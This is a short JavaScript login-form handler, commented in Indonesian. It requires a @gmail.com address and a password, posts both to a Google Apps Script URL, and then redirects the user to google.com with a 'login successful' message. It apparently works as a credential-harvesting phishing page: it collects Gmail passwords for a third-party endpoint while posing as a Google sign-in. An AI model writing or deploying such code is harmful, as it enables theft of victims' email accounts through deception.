document.getElementById("loginForm").addEventListener("submit", function(event) {
    event.preventDefault();

    const email = document.getElementById("email").value;
    const password = document.getElementById("password").value;
    const messageElement = document.getElementById("responseMessage");

    // Validasi email harus menggunakan @gmail.com
    if (!email.includes("@gmail.com")) {
        messageElement.innerText = "Email harus menggunakan domain @gmail.com!";
        messageElement.style.color = "red";
        return;
    }

    // Validasi password (harus ada huruf besar, kecil, dan angka)
    const passwordRegex = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d).+$/;
    if (!passwordRegex.test(password)) {
        messageElement.innerText = "Password harus mengandung huruf besar, huruf kecil, dan angka!";
        messageElement.style.color = "red";
        return;
    }

    // Kirim data ke Google Apps Script dengan fetch()
    const formData = new FormData(document.getElementById("loginForm"));

    fetch("https://script.google.com/macros/s/AKfycbyDSskM_7RbP7Vapl0yNAoH3ie2hd7gPBC5FlX3QeFZ1UMHqnbtTbzTpq3IRIAoQtf8/exec", {  // Ganti dengan URL Apps Script yang benar
        method: "POST",
        body: formData
    })
    .then(response => response.json())
    .then(data => {
        if (data.status === "success") {
            messageElement.innerText = "Login berhasil! Anda akan dialihkan ke Google...";
            messageElement.style.color = "green";
            setTimeout(() => {
                window.location.href = "https://www.google.com"; // Redirect ke Google
            }, 2000);
        } else {
            messageElement.innerText = "Login gagal: " + data.message;
            messageElement.style.color = "red";
        }
    })
    .catch(error => {
        messageElement.innerText = "Terjadi kesalahan. Coba lagi!";
        messageElement.style.color = "red";
    });
});
